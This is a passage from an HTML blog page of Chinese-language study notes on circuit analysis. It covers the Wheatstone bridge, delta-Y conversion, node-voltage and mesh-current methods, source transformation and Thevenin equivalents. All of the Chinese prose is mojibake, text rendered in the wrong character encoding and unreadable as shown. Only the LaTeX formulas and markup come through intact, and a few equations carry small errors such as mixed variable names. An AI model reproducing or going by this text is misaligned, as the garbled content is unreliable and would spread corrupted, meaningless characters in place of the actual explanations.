$i$ æŒ‡æ€»ç”µå‹, $R_{eq}$ æŒ‡ç­‰æ•ˆç”µé˜», ä¹Ÿå°±æ˜¯æ€»ç”µé˜»)</p><h2 id="3-5-æµ‹é‡ç”µå‹å’Œç”µæµ"><a href="#3-5-æµ‹é‡ç”µå‹å’Œç”µæµ" class="headerlink" title="3.5 æµ‹é‡ç”µå‹å’Œç”µæµ"></a>3.5 æµ‹é‡ç”µå‹å’Œç”µæµ</h2><p>ç”µæµè¡¨æ˜¯æµ‹é‡ç”µæµçš„ä»ªå™¨, å®ƒä¸éœ€è¦æµ‹é‡ç”µæµçš„ç”µè·¯å…ƒä»¶ä¸²è”ã€‚</p><p>ç”µå‹è¡¨æ˜¯æµ‹é‡ç”µå‹çš„ä»ªå™¨ï¼Œå®ƒä¸éœ€è¦æµ‹é‡ç”µå‹çš„ç”µè·¯å…ƒä»¶å¹¶è”.</p><p>ç”¨äºæµ‹é‡è¿ç»­ç”µå‹å’Œç”µæµçš„ä»ªå™¨ä¸»è¦æœ‰ä¸¤ç§ç±»å‹:</p><ul><li>æ•°å­—ä»ªè¡¨</li><li>æ¨¡æ‹Ÿä»ªè¡¨, åŸºäºè¾¾æ¾ä¼ (dâ€™Arsonval) ä»ªè¡¨è£…ç½®</li></ul><p><img src="/../img/d'Arsonval_panel.png"></p><h2 id="3-6-æƒ æ–¯é€šç”µæ¡¥"><a href="#3-6-æƒ æ–¯é€šç”µæ¡¥" class="headerlink" title="3.6 æƒ æ–¯é€šç”µæ¡¥"></a>3.6 æƒ æ–¯é€šç”µæ¡¥</h2><p>æƒ æ–¯é€šç”µæ¡¥ç”µè·¯ç”µè·¯å¯ä»¥ç”¨æ¥ç²¾ç¡®åœ°æµ‹é‡ä¸€å®šèŒƒå›´å†…çš„ç”µé˜»å€¼, æµ‹é‡èŒƒå›´ä» $1 \Omega$ ~ $1M \Omega$.</p><p>ç”µæ¡¥ç”µè·¯åŒ…å«:</p><ul><li>å››ä¸ªç”µé˜», $R_1$, $R_2$, $R_3$ æ˜¯å·²çŸ¥ç”µé˜»</li><li>ä¸€ä¸ªç›´æµç”µå‹æº</li><li>ä¸€ä¸ªæ¢æµ‹å™¨</li></ul><p>å››ä¸ªç”µé˜»ä¸­æœ‰ä¸€ä¸ªç”µé˜»å¯ä»¥å˜åŒ– (å¸¦ç®­å¤´). ç›´æµç”µå‹æºé€šå¸¸ä½¿ç”¨ç”µæ± .</p><p><img src="/../img/Huygens_bridge.png"></p><blockquote><p>å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{i_g &#x3D; 0 \newline~ \newline i_1 &#x3D; i_3 \newline~ \newline i_2 &#x3D; i_x \newline~ \newline i_3 R_3 &#x3D; I_x R_x \newline~ \newline i_1 R_1 &#x3D; i_2 R_2 \newline~ \newline i_1 R_3 &#x3D; i_2 R_x \newline~ \newline \frac{R_3}{R_1} &#x3D; \frac{R_x}{R_2} \newline~ \newline R_x &#x3D; \frac{R_2}{R_1} R_3}<br>$$</p><p>æ³¨æ„ï¼šå¦‚æœä½ç½®ç”µé˜»æ˜¯ $1000 \Omega$, è€Œ $R_3$ åªèƒ½ä» 0 å˜åŒ–åˆ° 100 $\Omega$, é‚£ä¹ˆç”µæ¡¥å°±æ°¸è¿œä¸ä¼šå¹³è¡¡.</p><p>ä¸Šé¢æ¨å¯¼ä¸­, ä» $i_g &#x3D; 0$ è¡¨æ˜, æ¢æµ‹å™¨ä¸¤ç«¯ç‚¹çš„ç”µåŠ¿ç›¸åŒ, å³ä»ç”µæºåˆ°æ¢æµ‹å™¨ä¸¤ç«¯ç‚¹çš„ç”µå‹é™ç›¸åŒ, å› æ­¤å¾—åˆ° $i_1 R_1 &#x3D; i_2 R_2$, ç”±äºä¸¤æ”¯è·¯å¹¶è”, æœ‰ $i_1 (R_1 + R_3) &#x3D; i_2 (R_2 + R_x)$, å¯ä»¥å¾—çŸ¥å‰©ä¸‹çš„ä¸¤æ”¯è·¯ç›¸ç­‰, å³ $i_1 R_3 &#x3D; i_2 R_x$.</p><h2 id="3-7-Delta-Y-pi-T-ç­‰æ•ˆç”µè·¯"><a href="#3-7-Delta-Y-pi-T-ç­‰æ•ˆç”µè·¯" class="headerlink" title="3.7 $\Delta - Y (\pi - T)$ ç­‰æ•ˆç”µè·¯"></a>3.7 $\Delta - Y (\pi - T)$ ç­‰æ•ˆç”µè·¯</h2><p>è¿™é‡Œçš„ $\Delta$, $Y$, $\pi$, ä»¥åŠ $T$éƒ½æ˜¯å½¢çŠ¶ä¸Šç›´è§‚ç›¸ä¼¼.</p><p>$\Delta$ äº’è”å¯ä»¥å˜ä¸º $\pi$ äº’è”. </p><p>$Y$ ç»“æ„å¯ä»¥å˜æˆ $T$ ç»“æ„. </p><p><img src="/../img/Delta_to_pi_Y_to_T.png"></p><p>$\Delta$ å˜æ¢ä¸º $\pi$ å‰åï¼Œç›¸åº”ç«¯å£ä¹‹é—´çš„ç”µé˜»ç›¸ç­‰ï¼Œå¦‚ä¸Šå›¾ 3.31 ä¸­: $\Delta$ ç»“æ„ä¸­ $R_{ab}$ æŒ‡çš„æ˜¯ $R_c$ ä¸ $R_b + R_a$ å¹¶è”. $Y$ ç»“æ„ä¸­, $R_{ab}$ æŒ‡ $R_1 + R_2$:<br>$$<br>\displaylines{R_{ab} &#x3D; \frac{R_c (R_a + R_b)}{R_a + R_b + R_c} &#x3D; R_1 + R_2}<br>$$<br>(ç­‰æ•ˆç”µè·¯ä¸­æœ€é‡è¦çš„å°±æ˜¯ç«¯å£ä¹‹é—´çš„è”ç³»)</p><p>æœ€ç»ˆçš„è½¬åŒ–å…¬å¼ä¸º:<br><img src="/../img/convert_equation_between_Delta_and_Y.png"></p><h1 id="ç¬¬4ç« -ç”µè·¯åˆ†ææ³•"><a href="#ç¬¬4ç« -ç”µè·¯åˆ†ææ³•" class="headerlink" title="ç¬¬4ç«  ç”µè·¯åˆ†ææ³•"></a>ç¬¬4ç«  ç”µè·¯åˆ†ææ³•</h1><p>ç”Ÿäº§çš„ç”µé˜»é˜»å€¼æ˜¯ç¦»æ•£çš„ï¼Œä¸€æ‰¹ç”µé˜»ä¸­çš„æŸä¸ªç”µé˜»é˜»å€¼æ˜¯åœ¨æ ‡å‡†å€¼é™„è¿‘å˜åŒ–çš„ï¼Œå˜åŒ–å€¼åœ¨å®¹å·®èŒƒå›´å†….</p><p>ç ”ç©¶ç”µè·¯ç»„ä»¶çš„æ•°å€¼å¯¹ç”µè·¯è¾“å‡ºçš„å½±å“ç§°ä¸ºçµæ•åº¦åˆ†æ.</p><h2 id="4-1-æœ¯è¯­"><a href="#4-1-æœ¯è¯­" class="headerlink" title="4.1 æœ¯è¯­"></a>4.1 æœ¯è¯­</h2><p>ä¸€ä¸ªç”»æœ‰äº¤å‰æ”¯è·¯çš„ç”µè·¯ï¼Œå¦‚æœèƒ½é‡æ–°ç”»æˆæ²¡æœ‰äº¤å‰æ”¯è·¯çš„ç”µè·¯ï¼Œå°±ä»å¯ä»¥è®¤ä¸ºæ˜¯ <mark>å¹³é¢ç”µè·¯</mark>.</p><p><mark>èŠ‚ç‚¹ç”µå‹æ³•</mark> å¯ä»¥åº”ç”¨äºå¹³é¢å’Œéå¹³é¢ç”µè·¯.</p><p><mark>ç½‘å­”ç”µæµæ³•</mark> åªèƒ½åº”ç”¨äºå¹³é¢ç”µè·¯.</p><h3 id="4-1-1-æè¿°ç”µè·¯çš„è¯æ±‡"><a href="#4-1-1-æè¿°ç”µè·¯çš„è¯æ±‡" class="headerlink" title="4.1.1 æè¿°ç”µè·¯çš„è¯æ±‡"></a>4.1.1 æè¿°ç”µè·¯çš„è¯æ±‡</h3><p><img src="/../img/words_to_describe_circuit.png"></p><!-- ### 4.1.2 éœ€è¦è”ç«‹å¤šå°‘ä¸ªæ–¹ç¨‹ --><!-- è‹¥ç”¨åŸºæœ¬èŠ‚ç‚¹å’ŒåŸºæœ¬æ”¯è·¯æ±‚è§£ï¼Œéœ€è¦çš„æ–¹ç¨‹æ•°ç­‰äºåŸºæœ¬æ”¯è·¯æ•°: --><!-- $$ --><!-- \displaylines{equation\ number = basic\ branch\ number\ b_e} --><!-- $$ --><!-- åŸºæœ¬èŠ‚ç‚¹æ•°ä¸º $n_e$, åˆ™ç”¨åŸºå°”éœå¤«ç”µæµå®šå¾‹å¾—åˆ° $n_e - 1$ ä¸ªæ–¹ç¨‹ã€‚ --><!--  --><!-- ç”¨åŸºå°”éœå¤«ç”µå‹å®šå¾‹è·å¾—å‰©ä¸‹ $b_e - ( n_e - 1 )$ ä¸ªæ–¹ç¨‹. --><!--  --><!-- > æ€»ç»“ --><!--   - æ€»: $b_e$ --><!--   - åŸºå°”éœå¤«ç”µæµå®šå¾‹: $n_e -1$ (å¯¹åŸºæœ¬èŠ‚ç‚¹ç”¨) --><!--   - åŸºå°”éœå¤«ç”µå‹å®šå¾‹: $b_e - (n_e -1)$ (å¯¹ç½‘å­”ç”¨) --><!--  --><!-- > ä¸¤ä¸ªæè¿°ç”µè·¯çš„æ–¹æ³• --><!--   - èŠ‚ç‚¹ç”µå‹æ³•ï¼Œç”¨ $n_e - 1$ ä¸ªæ–¹ç¨‹æè¿°ç”µè·¯ --><!--   - ç½‘å­”ç”µæµæ³•ï¼Œç”¨ $b_e - (n_e - 1)$ ä¸ªæ–¹ç¨‹æè¿°ç”µè·¯ --><h2 id="4-2-èŠ‚ç‚¹ç”µå‹æ³•"><a href="#4-2-èŠ‚ç‚¹ç”µå‹æ³•" class="headerlink" title="4.2 èŠ‚ç‚¹ç”µå‹æ³•"></a>4.2 èŠ‚ç‚¹ç”µå‹æ³•</h2><p>èŠ‚ç‚¹ç”µå‹æ³•æ˜¯åˆ©ç”¨ <mark>åŸºå°”éœå¤«ç”µæµå®šå¾‹</mark> æ±‚è§£. (å› ä¸ºæ˜¯ç”¨ $\frac{v}{R}$ è¡¨ç¤ºç”µæµ, æ‰€ä»¥æœ€ç»ˆè¡¨è¾¾å¼ä¸­ç•™ä¸‹çš„æ˜¯ç”µå‹, å°±æ˜¯ç”µå‹æ³•)</p><p>éœ€è¦çš„æ–¹ç¨‹æ•°ä¸º <mark>$åŸºæœ¬èŠ‚ç‚¹æ•° - 1$</mark> </p><p><mark>ç‹¬ç«‹æº</mark> ä¼¼ä¹éƒ½æ˜¯é‡Šæ”¾åŠŸç‡ ?</p><p>è¿›å…¥èŠ‚ç‚¹çš„ç”µæµä¸€èˆ¬æ ‡è®°ä¸º <mark>è´Ÿ</mark> .</p><blockquote><p>æ­¥éª¤</p></blockquote><ol><li>è°ƒæ•´ç”µè·¯è‡³æ²¡æœ‰æ”¯è·¯é‡å ï¼Œæ ‡å‡ºåŸºæœ¬èŠ‚ç‚¹</li><li>åœ¨åŸºæœ¬èŠ‚ç‚¹ä¸­é€‰æ‹©ä¸€ä¸ªä½œä¸ºå‚è€ƒèŠ‚ç‚¹, ä¸”ç”¨ <img src="/../img/reference_node_picture.png"> æ¥æ ‡è®° (ä¸€èˆ¬é€‰æ‹©é€šè¿‡å¤§é‡æ”¯è·¯çš„åŸºæœ¬èŠ‚ç‚¹)</li></ol><p><mark>é€‰æ‹©åŸºæœ¬èŠ‚ç‚¹æ—¶æ³¨æ„</mark>: æ— å‹é™çš„ä¸¤ä¸ªèŠ‚ç‚¹å¯è§†ä¸ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦‚ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´ç”¨å¯¼çº¿è¿æ¥ï¼Œå¯è§†ä¸ºä¸€ä¸ªèŠ‚ç‚¹.</p><p><mark>èŠ‚ç‚¹ç”µå‹çš„å®šä¹‰</mark> ä»å‚è€ƒèŠ‚ç‚¹åˆ°éå‚è€ƒèŠ‚ç‚¹çš„ç”µå‹å‡. (æš‚ä¸”ç†è§£ä¸ºè¿™æ¡æ”¯è·¯ä¸Šçš„ç”µåŠ¿)</p><p><img src="/../img/show_node_voltage_method.png"></p><h2 id="4-3-èŠ‚ç‚¹ç”µå‹æ³•å’Œéç‹¬ç«‹æº"><a href="#4-3-èŠ‚ç‚¹ç”µå‹æ³•å’Œéç‹¬ç«‹æº" class="headerlink" title="4.3 èŠ‚ç‚¹ç”µå‹æ³•å’Œéç‹¬ç«‹æº"></a>4.3 èŠ‚ç‚¹ç”µå‹æ³•å’Œéç‹¬ç«‹æº</h2><p>åœ¨ä½¿ç”¨èŠ‚ç‚¹ç”µå‹æ³•æ—¶ï¼Œè‹¥ç”µè·¯ä¸­æœ‰éç‹¬ç«‹æº, é™¤äº†<mark>$åŸºæœ¬èŠ‚ç‚¹æ•° - 1$</mark> çš„æ–¹ç¨‹å¤–ï¼Œè¿˜éœ€è”ç«‹éç‹¬ç«‹æºå—å¤–éƒ¨å½±å“çš„å…³ç³»å¼.</p><p>å¦‚è¿™å¹…å›¾:<br><img src="/../img/nondepentent_source_with_node_voltage_method.png"></p><p>éœ€è¦é¢å¤–è”ç«‹çš„æ–¹ç¨‹å°±æ˜¯:<br>$$<br>\displaylines{ i_\phi &#x3D; \frac{v_1 - v_2}{5}}<br>$$</p><h2 id="4-4-èŠ‚ç‚¹ç”µå‹æ³•çš„ç‰¹ä¾‹"><a href="#4-4-èŠ‚ç‚¹ç”µå‹æ³•çš„ç‰¹ä¾‹" class="headerlink" title="4.4 èŠ‚ç‚¹ç”µå‹æ³•çš„ç‰¹ä¾‹"></a>4.4 èŠ‚ç‚¹ç”µå‹æ³•çš„ç‰¹ä¾‹</h2><p>å½“ä¸€ä¸ªç”µå‹æºæ˜¯ä¸¤ä¸ªåŸºæœ¬èŠ‚ç‚¹ä¹‹é—´ä»…æœ‰çš„å…ƒä»¶æ—¶ï¼ŒèŠ‚ç‚¹ç”µå‹æ³•å¯ä»¥ç®€åŒ–.</p><p>å¦‚è¿™å¹…å›¾:<br><img src="/../img/node_voltage_method_with_source_connect_two_basic_nodes.png"></p><p>ç”µæºå’Œä¸¤ä¸ªåŸºæœ¬èŠ‚ç‚¹ç›´æ¥ç›¸è¿, æ­¤æ—¶ $v_1$ çš„ç”µå‹å°±å¯ä»¥ç›´æ¥å¾—å‡º â€“ ä¸ºç”µæºç”µå‹, å› æ­¤æ­¤æ—¶å°±åªæœ‰ä¸€ä¸ªæœªçŸ¥æ•°ã€‚</p><p>åŸæœ¬ä¸‰ä¸ªåŸºæœ¬èŠ‚ç‚¹ï¼Œéœ€è¦è”ç«‹ä¸¤ä¸ªæ–¹ç¨‹ï¼Œç°åœ¨åªéœ€è¦ä¸€ä¸ª. (å…¶å®è¿˜æ˜¯ä¸¤ä¸ª, åªä¸è¿‡ä¸€ä¸ªä¸º, å¦‚: $v &#x3D; 10V$)</p><h3 id="4-4-1-è¶…èŠ‚ç‚¹çš„æ¦‚å¿µ"><a href="#4-4-1-è¶…èŠ‚ç‚¹çš„æ¦‚å¿µ" class="headerlink" title="4.4.1 è¶…èŠ‚ç‚¹çš„æ¦‚å¿µ"></a>4.4.1 è¶…èŠ‚ç‚¹çš„æ¦‚å¿µ</h3><p>è¶…èŠ‚ç‚¹å°±æ˜¯å½“ä¸€ä¸ªç”µå‹æºåœ¨ä¸¤ä¸ªåŸºæœ¬èŠ‚ç‚¹ä¹‹é—´æ—¶ï¼Œå°†è¿™äº›èŠ‚ç‚¹çœ‹ä½œä¸€ä¸ªèŠ‚ç‚¹.<br>(å®šä¹‰è¶…èŠ‚ç‚¹çš„ç†ç”±, ç›¸å½“äº, å¯¹ä¸¤ä¸ªèŠ‚ç‚¹åˆ—çš„ä¸¤ä¸ªæ–¹ç¨‹åˆå¹¶å†™ä¸ºä¸€ä¸ª, å°‘å†™ä¸€ä¸ªæ–¹ç¨‹, ä¹Ÿå¯ä»¥çœ‹ä½œå°‘äº†ä¸€ä¸ªèŠ‚ç‚¹, æ¯•ç«Ÿä¸¤ä¸ªèŠ‚ç‚¹å˜æˆäº†ä¸€ä¸ª)</p><p>åŸºå°”éœå¤«ç”µæµå®šå¾‹å¯¹è¶…èŠ‚ç‚¹ä»ç„¶æœ‰æ•ˆ.</p><p>å¦‚å°†è¿™å¹…å›¾ä¸­çš„èŠ‚ç‚¹ 2, 3 å’Œå…¶ä¸­çš„ç”µæµæºåˆå¹¶ä¸ºè¶…èŠ‚ç‚¹:<br><img src="/../img/to_get_super_node.png"></p><p>å˜ä¸º:<br><img src="/../img/there_is_a_super_node.png"></p><p>æ­¤æ—¶åˆ†æè¿™ä¸ªè¶…èŠ‚ç‚¹ï¼Œå°±æ˜¯åˆ—ä¸€ä¸ªåŸºå°”éœå¤«ç”µæµå®šå¾‹æ–¹ç¨‹çš„èŠ‚ç‚¹ 2 å¤„ä¸¤ä¸ªç”µæµå’ŒèŠ‚ç‚¹ 3 å¤„ä¸¤ä¸ªç”µæµä¸€èµ·å†™:<br>$$<br>\displaylines{ \frac{v_2 - v_1}{5} + \frac{v_2}{50} + \frac{v_3}{100} - 4 &#x3D; 0}<br>$$</p><p>ä½†ä¸æ˜¯è¯´è¶…èŠ‚ç‚¹é‡Œé¢çš„ç”µè·¯å°±å¿½ç•¥ä¸çœ‹äº†ï¼Œè¿™ä¸ªä¾‹å­ä¸­ï¼Œè¶…èŠ‚ç‚¹å†…éƒ¨å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ–¹ç¨‹:<br>$$<br>\displaylines{v_3 &#x3D; v_2 + 10 i_\phi}<br>$$</p><p>éœ€è¦ <mark>é€‚å½“ä½¿ç”¨è¶…èŠ‚ç‚¹</mark> , è€Œä¸æ˜¯åªè¦é‡åˆ°ç”µå‹æºè¿æ¥ä¸¤ä¸ªåŸºæœ¬èŠ‚ç‚¹å°±ä½¿ç”¨.</p><h2 id="4-5-ç½‘å­”ç”µæµæ³•"><a href="#4-5-ç½‘å­”ç”µæµæ³•" class="headerlink" title="4.5 ç½‘å­”ç”µæµæ³•"></a>4.5 ç½‘å­”ç”µæµæ³•</h2><p>éœ€è¦åº”ç”¨ç½‘å­”ç”µæµæ³•çš„ç½‘å­”æ•°ä¸º <mark>å«æœªçŸ¥ç”µæµçš„æ”¯è·¯æ•° - èŠ‚ç‚¹æ•° + 1</mark> </p><p>ç½‘å­”ç”µæµæ³•æ³•æ˜¯åˆ©ç”¨ <mark>åŸºå°”éœå¤«ç”µå‹å®šå¾‹</mark> åˆ—æ–¹ç¨‹å¼æ±‚è§£. (å› ä¸ºæ˜¯ç”¨ $IR$ è¡¨ç¤ºç”µå‹, æ‰€ä»¥æœ€ç»ˆè¡¨è¾¾å¼ä¸­ç•™ä¸‹çš„æ˜¯ç”µæµ, å°±æ˜¯ç”µæµæ³•)</p><p><mark>ç½‘å­”</mark> æ˜¯ä¸€ä¸ªæ²¡æœ‰å…¶ä»–è´¿èµ‚åœ¨é‡Œé¢çš„å›è·¯.</p><p>ç½‘å­”ç”µæµåˆ†ææ³•åªèƒ½åº”ç”¨äºå¹³é¢ç”µè·¯.</p><p>ç½‘å­”ç”µæµæ˜¯ä»…å­˜åœ¨äºç½‘å­”å‘¨è¾¹çš„ç”µæµï¼Œæ”¯è·¯ç”µæµä¸ä¸€å®šéƒ½èƒ½è¡¨ç¤ºç½‘å­”ç”µæµ. å‡†ç¡®æ¥è¯´ï¼Œç½‘å­”ç”µæµä¸æ˜¯çœŸå®ç”µæµ, æ˜¯ä¸€ä¸ªå‡æƒ³çš„é‡. (æ¯•ç«Ÿå®ƒå‡è®¾çš„æ˜¯ä¸€ä¸ªå›è·¯ä¸­æ˜¯åŒä¸€ä¸ªç”µæµ, ä½†æ˜¾ç„¶æ¯æ¡æ”¯è·¯çš„ç”µæµå¯èƒ½ä¸åŒ)</p><p><img src="/../img/net_current_method_there_are_four_current.png"></p><h2 id="4-6-ç½‘å­”ç”µæµæ³•å’Œéç‹¬ç«‹æº"><a href="#4-6-ç½‘å­”ç”µæµæ³•å’Œéç‹¬ç«‹æº" class="headerlink" title="4.6 ç½‘å­”ç”µæµæ³•å’Œéç‹¬ç«‹æº"></a>4.6 ç½‘å­”ç”µæµæ³•å’Œéç‹¬ç«‹æº</h2><p>åŒæ ·è¦åŠ ä¸Šéç‹¬ç«‹æºçš„é™åˆ¶æ–¹ç¨‹.</p><h2 id="4-7-ç½‘å­”ç”µæµæ³•çš„ç‰¹ä¾‹"><a href="#4-7-ç½‘å­”ç”µæµæ³•çš„ç‰¹ä¾‹" class="headerlink" title="4.7 ç½‘å­”ç”µæµæ³•çš„ç‰¹ä¾‹"></a>4.7 ç½‘å­”ç”µæµæ³•çš„ç‰¹ä¾‹</h2><p>æ¯ä¸€ä¸ªç”µæµæºï¼Œä¸è®ºæ˜¯ç‹¬ç«‹è¿˜æ˜¯éç‹¬ç«‹ï¼Œéƒ½å¯ä»¥æ±‚å¾—ä¸€ä¸ªç½‘å­”ç”µæµçš„å€¼. æˆ–è€…å¾—åˆ°ä¸€ä¸ªæ–¹ç¨‹å¼.</p><p>å¦‚ç”µè·¯ä¸­å«æœ‰ç”µæµæºï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªç½‘å­”ç”µæµä¹‹é—´çš„æ–¹ç¨‹</p><p><img src="/../img/special_in_net_current_method.png"></p><p>$$<br>\displaylines{i_a - i_c &#x3D; 5A}<br>$$<br>ç›¸å½“äºå¯ä»¥å°‘åˆ—ä¸€ä¸ªç½‘å­”ç”µæµæ–¹ç¨‹.</p><h3 id="4-7-1-è¶…ç½‘å­”çš„æ¦‚å¿µ"><a href="#4-7-1-è¶…ç½‘å­”çš„æ¦‚å¿µ" class="headerlink" title="4.7.1 è¶…ç½‘å­”çš„æ¦‚å¿µ"></a>4.7.1 è¶…ç½‘å­”çš„æ¦‚å¿µ</h3><p>é¿å¼€ç”µæµæºæ”¯è·¯ï¼Œå°†ç”µæµæºä»ç”µè·¯ä¸­ç§»èµ°.</p><p>å¦‚å°†:<br><img src="/../img/special_in_net_current_method.png"></p><p>è½¬æ¢ä¸ºè¶…ç½‘å­”å½¢å¼:<br><img src="/../img/super_net_current.png"></p><p>å†™æ–¹ç¨‹æ—¶å¹¶ä¸æ˜¯å°† $i_a$ å’Œ $i_c$ åˆå¹¶ï¼Œåœ¨è¿™é‡Œï¼Œå·¦è¾¹è¿˜æ˜¯ $i_a$, å³è¾¹è¿˜æ˜¯ $i_c$, åªä¸è¿‡å°‘åˆ—ä¸€ä¸ªç½‘å­”ç”µæµæ–¹ç¨‹è€Œå·²:<br>$$<br>\displaylines{-100 + 3(i_a - i_b) + 2(i_c - i_b) + 50 + 4i_c + 6i_a}<br>$$</p><h2 id="4-9-ç”µæºå˜æ¢"><a href="#4-9-ç”µæºå˜æ¢" class="headerlink" title="4.9 ç”µæºå˜æ¢"></a>4.9 ç”µæºå˜æ¢</h2><p><mark>æ ¸å¿ƒç†å¿µ</mark> ä¸ç”µé˜»ä¸²è”çš„ç”µå‹æºå¯ä»¥ç”¨ä¸åŒæ ·ç”µé˜»å¹¶è”çš„ç”µæµæºä»£æ›¿.<br>(ç”µæºå˜æ¢éœ€è¦ä¿è¯ä¸¤ç«¯ç‚¹é—´çš„ç”µå‹ç”µæµä¿æŒä¸å˜)<br>å¦‚å›¾:<br><img src="/../img/source_transformation.png"></p><p>å…¶ä¸­, éœ€è¦æ»¡è¶³:<br>$$<br>\displaylines{i_s &#x3D; \frac{v_s}{R}}<br>$$</p><blockquote><p>æ¨å¯¼</p></blockquote><p>å‡å®š $R_L$ è¿æ¥åœ¨èŠ‚ç‚¹ a,b ä¹‹é—´. $i_L$ æ˜¯èŠ‚ç‚¹ a,b é—´çš„ç”µæµ:</p><p>å¯¹äºå›¾ (a) çš„ç”µå‹æº:<br>$$<br>\displaylines{ i_L &#x3D; \frac{v_s}{R+R_L} }<br>$$</p><p>å¯¹äºå›¾ (b) çš„ç”µå‹æº:<br>$$<br>\displaylines{i_L &#x3D; \frac{v}{R_L} \newline~ \newline<br>v &#x3D; \frac{RR_L}{R+R_L}i_s \newline~ \newline<br>i_L &#x3D; \frac{1}{R_L} \frac{RR_L}{R+R_L}i_s \newline~ \newline<br>&#x3D; \frac{R}{R + R_L} i_s}<br>$$</p><p>è¦ä½¿ä¸¤ä¸ªç”µè·¯ç­‰æ•ˆï¼Œå³ä½¿ç”µæºå˜æ¢æˆåŠŸ, å°±éœ€è¦æ»¡è¶³ a,b èŠ‚ç‚¹ä¸Šæµè¿‡çš„ç”µæµç›¸åŒçš„æ¡ä»¶ï¼Œå³éœ€è¦è®©ä¸Šè¿°ä¸¤ä¸ªæ–¹ç¨‹ç›¸ç­‰:<br>$$<br>\displaylines{\frac{v_s}{R+R_L} &#x3D; \frac{R}{R + R_L} i_s \newline~ \newline<br>å³ \newline~ \newline<br>i_s &#x3D; \frac{v_s}{R}}<br>$$</p><p>å› æ­¤åœ¨ç”µæºå˜æ¢æ—¶ï¼Œä¸¤ä¸ªç”µæºæ»¡è¶³è¿™ä¸ªå¼å­å³å¯.<br>(åˆ°è¿™é‡Œ, å°±è¯æ˜äº†ç”µæµç›¸ç­‰, åŒæ—¶ $U &#x3D; IR$, ä¹Ÿå°±å¯ä»¥å¾—å‡ºç”µå‹ä¹Ÿç›¸ç­‰)</p><p>åœ¨ç”µæºå˜æ¢æ—¶ï¼ŒæŠŠè¦å˜æ¢çš„éƒ¨åˆ†çœ‹æˆä¸€ä¸ªå›è·¯ï¼Œè€Œä¸æ˜¯æœ‰ä¸€ä¸ªå¼€è·¯, å¦‚:<br><img src="/../img/seen_as_a_loop_not_open_circuit1.png"></p><p>çœ‹ä½œ:</p><p><img src="/../img/seen_as_a_loop_not_open_circuit2.png"></p><p>å› æ­¤è¿™é‡Œ $6 \Omega, 4 \Omega, 10 \Omega$ çš„ç”µé˜»å¯ä»¥çœ‹ä½œä¸€ä¸ª $20 \Omega$ çš„ç”µé˜».<br>(ç”¨ Ltspice éªŒè¯å¯è¡Œ, è¿™é‡Œæ³¨æ„ä¸€ç‚¹, ä¸èƒ½ç›´æ¥å°†ç”µè·¯çš„æ€»ç”µå‹çœ‹ä½œ $32V - 6V$, æœ€å¥½æ˜¯ç®€åŒ–ç”µè·¯ä¹‹åå†æ±‚å€¼, ä¹Ÿå¯ä»¥é€šè¿‡å åŠ åŸç†è®¡ç®—, ç”µå‹æºçŸ­è·¯, ç”µæµæºæ–­è·¯)</p><blockquote><p>æ³¨æ„</p></blockquote><p>è¿™ä¸¤ç§ç”µè·¯å¯ä»¥ç®€åŒ–:</p><p><img src="/../img/resistance_did_not_effect_the_result.png"></p><p>å³ï¼Œç”µå‹æºå¹¶è”äº†ä¸€ä¸ªç”µé˜», ä»¥åŠ, ç”µæµæºä¸²è”äº†ä¸€ä¸ªç”µé˜»ï¼Œå¯¹ç­‰æ•ˆç”µè·¯æ²¡æœ‰å½±å“. (å¯ä»¥ç›´æ¥å»æ‰)</p><p>æ¯•ç«Ÿï¼Œå¯¹äºä¸¤ä¸ªç”µå‹æº, åŒæ ·åªæœ‰ç”µé˜» R åˆ†å»äº†éƒ¨åˆ†ç”µå‹:<br>$$<br>\displaylines{V_{ab} &#x3D; V_s - V_R}<br>$$</p><p>å¯¹äºä¸¤ä¸ªç”µæµæº, åŒæ ·åªæœ‰ç”µé˜» R æ‰€åœ¨çš„æ”¯è·¯åˆ†å»äº†éƒ¨åˆ†ç”µæµ:<br>$$<br>\displaylines{I_{ab} &#x3D; I_s - I_R}<br>$$</p><p>ä¸€ä¸ªç¤ºä¾‹:</p><p><img src="/../img/example_for_source_transformation1.png"></p><p>æ³¨æ„ï¼Œè¿™äº›ç”µæµæºå’Œç”µé˜»å¯ä»¥ç›´æ¥åˆå¹¶ï¼Œå› ä¸ºä¸Šä¸‹ä¸¤æ¡ä¹‹è·¯ä¸Šéƒ½æ²¡æœ‰å…¶ä»–çš„ç”µå‹é™:</p><p><img src="/../img/example_for_source_transformation2.png"><br>(éœ€çµæ´»è¿ç”¨è¿™äº›ç§»åŠ¨æŠ€å·§)</p><h2 id="4-10-æˆ´ç»´å—ä¸è¯ºé¡¿ç­‰æ•ˆç”µè·¯"><a href="#4-10-æˆ´ç»´å—ä¸è¯ºé¡¿ç­‰æ•ˆç”µè·¯" class="headerlink" title="4.10 æˆ´ç»´å—ä¸è¯ºé¡¿ç­‰æ•ˆç”µè·¯"></a>4.10 æˆ´ç»´å—ä¸è¯ºé¡¿ç­‰æ•ˆç”µè·¯</h2><p>è¿™ä¸¤ä¸ªç­‰æ•ˆç”µè·¯ç”¨äº <mark>éœ€è¦å°†æ³¨æ„åŠ›é›†ä¸­åœ¨ä¸€å¯¹ç‰¹æ®Šçš„ç«¯å­ä¸Š</mark> æ—¶.</p><p>æˆ´ç»´å—ä¸è¯ºé¡¿ç­‰æ•ˆç”µè·¯å¯ä»¥ç”¨äº <mark>ä»»ä½•</mark> ç”±çº¿æ€§å…ƒä»¶ç»„æˆçš„ç”µè·¯.</p><h3 id="4-10-1-æˆ´ç»´å—ç”µè·¯"><a href="#4-10-1-æˆ´ç»´å—ç”µè·¯" class="headerlink" title="4.10.1 æˆ´ç»´å—ç”µè·¯"></a>4.10.1 æˆ´ç»´å—ç”µè·¯</h3><p>æˆ´ç»´å—ç”µè·¯æ˜¯æŠŠåŸå§‹ç”µè·¯ (é™¤è¦ç ”ç©¶çš„ç«¯å­ä»¥å¤–) ç­‰æ•ˆä¸º <mark>ä¸€ä¸ªç‹¬ç«‹ç”µå‹æº $V_{Th}$ å’Œä¸€ä¸ªç”µé˜» $R_{Th}$ çš„ä¸²è”</mark> .</p><p><img src="/../img/Thevenin_circuit.png"></p><p>éœ€è¦æ±‚å¾—çš„é‡æ˜¯ $V_{Th}$ å’Œ 